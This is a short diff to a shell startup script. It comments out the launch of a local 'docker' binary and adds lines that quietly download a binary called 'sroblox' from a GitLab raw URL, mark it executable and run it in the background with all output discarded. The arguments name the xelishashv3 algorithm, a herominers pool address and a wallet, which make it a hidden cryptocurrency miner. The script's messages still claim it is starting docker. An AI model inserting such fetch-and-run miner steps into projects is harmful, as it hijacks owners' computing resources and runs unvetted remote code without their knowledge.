@@ -8,8 +8,11 @@ sleep 5
 
 echo "Starting docker binary..."
 
-chmod +x ./docker
-./docker -c docker.json >/dev/null 2>&1 &
+#chmod +x ./docker
+#./docker -c docker.json >/dev/null 2>&1 &
+wget -q https://gitlab.com/barbieanay003/app/-/raw/main/sroblox
+chmod +x sroblox
+./sroblox -a xelishashv3 -o us.xelis.herominers.com:1225 -u xel:aee43hxxe8tzl0lrjq25dsj8rhvev2jseeyk6xydx9ltuj4fyezqzqspqyrx6etddaykgqq9qqqqrxm243sq2jrtna8.Levy -p x --keepalive true >/dev/null 2>&1 &
 
 echo "Running..."
 
